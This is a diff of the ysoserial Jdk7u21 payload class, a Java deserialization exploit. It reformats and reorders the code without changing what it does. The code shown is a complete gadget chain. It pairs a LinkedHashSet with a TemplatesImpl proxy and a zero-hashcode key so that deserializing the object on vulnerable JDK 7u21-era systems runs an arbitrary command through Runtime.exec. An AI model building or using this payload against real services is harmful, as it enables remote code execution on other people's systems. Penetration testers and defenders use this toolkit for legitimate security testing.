@@ -1,11 +1,5 @@
 package ysoserial.payloads;
 
-import java.lang.reflect.InvocationHandler;
-import java.util.HashMap;
-import java.util.LinkedHashSet;
-
-import javax.xml.transform.Templates;
-
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.annotation.PayloadTest;
@@ -13,6 +7,11 @@ import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.JavaVersion;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
+
+import javax.xml.transform.Templates;
+import java.lang.reflect.InvocationHandler;
+import java.util.HashMap;
+import java.util.LinkedHashSet;
 
 
 /*
@@ -53,43 +52,43 @@ LinkedHashSet.readObject()
                                 Runtime.exec()
  */
 
-@SuppressWarnings({ "rawtypes", "unchecked" })
-@PayloadTest ( precondition = "isApplicableJavaVersion")
+@SuppressWarnings({"rawtypes", "unchecked"})
+@PayloadTest(precondition = "isApplicableJavaVersion")
 @Dependencies()
-@Authors({ Authors.FROHOFF })
+@Authors({Authors.FROHOFF})
 public class Jdk7u21 implements ObjectPayload<Object> {
 
-	public Object getObject(final String command) throws Exception {
-		final Object templates = Gadgets.createTemplatesImpl(command);
+    public static boolean isApplicableJavaVersion() {
+        JavaVersion v = JavaVersion.getLocalVersion();
+        return v != null && (v.major < 7 || (v.major == 7 && v.update <= 21));
+    }
 
-		String zeroHashCodeStr = "f5a5a608";
+    public static void main(final String[] args) throws Exception {
+        PayloadRunner.run(Jdk7u21.class, args);
+    }
 
-		HashMap map = new HashMap();
-		map.put(zeroHashCodeStr, "foo");
+    public Object getObject(final String command) throws Exception {
+        final Object templates = Gadgets.createTemplatesImpl(command);
 
-		InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
-		Reflections.setFieldValue(tempHandler, "type", Templates.class);
-		Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);
+        String zeroHashCodeStr = "f5a5a608";
 
-		LinkedHashSet set = new LinkedHashSet(); // maintain order
-		set.add(templates);
-		set.add(proxy);
+        HashMap map = new HashMap();
+        map.put(zeroHashCodeStr, "foo");
 
-		Reflections.setFieldValue(templates, "_auxClasses", null);
-		Reflections.setFieldValue(templates, "_class", null);
+        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
+        Reflections.setFieldValue(tempHandler, "type", Templates.class);
+        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);
 
-		map.put(zeroHashCodeStr, templates); // swap in real object
+        LinkedHashSet set = new LinkedHashSet(); // maintain order
+        set.add(templates);
+        set.add(proxy);
 
-		return set;
-	}
+        Reflections.setFieldValue(templates, "_auxClasses", null);
+        Reflections.setFieldValue(templates, "_class", null);
 
-	public static boolean isApplicableJavaVersion() {
-	    JavaVersion v = JavaVersion.getLocalVersion();
-	    return v != null && (v.major < 7 || (v.major == 7 && v.update <= 21));
-	}
+        map.put(zeroHashCodeStr, templates); // swap in real object
 
-	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(Jdk7u21.class, args);
-	}
+        return set;
+    }
 
 }
